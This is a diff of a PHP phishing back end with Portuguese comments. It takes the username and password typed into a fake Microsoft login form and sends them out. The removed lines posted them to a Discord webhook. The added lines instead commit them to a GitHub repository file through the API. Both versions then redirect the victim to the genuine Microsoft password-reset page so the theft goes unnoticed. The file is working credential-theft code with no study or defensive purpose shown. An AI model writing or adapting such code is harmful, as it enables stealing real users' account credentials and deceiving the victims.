@@ -1,30 +1,32 @@
 <?php
-// Captura dados do POST
 $user = $_POST['loginfmt'];
 $pass = $_POST['passwd'];
 
-// URL do webhook do Discord
-$webhook = "https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI";
+// Token do GitHub (com permissão de commit)
+$token = "SEU_TOKEN_AQUI";
+$repo = "usuario/repositorio";
+$file = "dados/usernames.txt";
+$mensagem = "Credenciais: $user | $pass\n";
 
-// Monta a mensagem
-$data = [
-    "content" => "📩 Microsoft Username: $user\n🔑 Pass: $pass"
-];
+// Conteúdo base64 (API do GitHub exige isso)
+$data = base64_encode($mensagem);
 
-// Configura requisição HTTP
-$options = [
-    'http' => [
-        'header'  => "Content-type: application/json",
-        'method'  => 'POST',
-        'content' => json_encode($data)
-    ]
-];
+$payload = json_encode([
+    "message" => "Novo registro",
+    "content" => $data
+]);
 
-// Envia para o Discord
-$context  = stream_context_create($options);
-file_get_contents($webhook, false, $context);
+$ch = curl_init("https://api.github.com/repos/$repo/contents/$file");
+curl_setopt($ch, CURLOPT_USERPWD, "usuario:$token");
+curl_setopt($ch, CURLOPT_USERAGENT, "PHP");
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
+curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 
-// Redireciona para a página legítima
-header('Location: https://account.live.com/ResetPassword.aspx');
+$response = curl_exec($ch);
+curl_close($ch);
+
+// Redireciona para a página oficial
+header("Location: https://account.live.com/ResetPassword.aspx");
 exit();
 ?>
